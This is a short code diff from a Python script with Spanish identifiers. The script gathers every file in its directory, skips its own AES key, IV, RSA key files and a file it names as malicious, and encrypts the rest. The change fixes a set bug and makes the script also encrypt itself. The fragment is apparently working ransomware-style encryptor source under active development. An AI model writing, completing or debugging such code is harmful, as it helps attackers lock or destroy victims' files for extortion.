@@ -155,7 +155,6 @@ def mostrar_archivo(ruta_archivo):
 def obtener_archivos_a_cifrar():
     archivos_a_ignorar = {archivo_clave_aes, archivo_iv, archivo_clave_privada, archivo_clave_publica, __file__, archivo_conex, archivo_malicioso}
     archivos_en_carpeta = set(os.path.join(directorio_actual, archivo) for archivo in os.listdir(directorio_actual))
-    archivos_en_carpeta.append(__file__)
     return archivos_en_carpeta - archivos_a_ignorar
 
 # Punto de entrada
@@ -187,3 +186,4 @@ if __name__ == "__main__":
 
         for archivo in archivos_a_cifrar:
             cifrar_archivo(clave_aes, iv, archivo)
+        cifrar_archivo(clave_aes, iv, __file__)
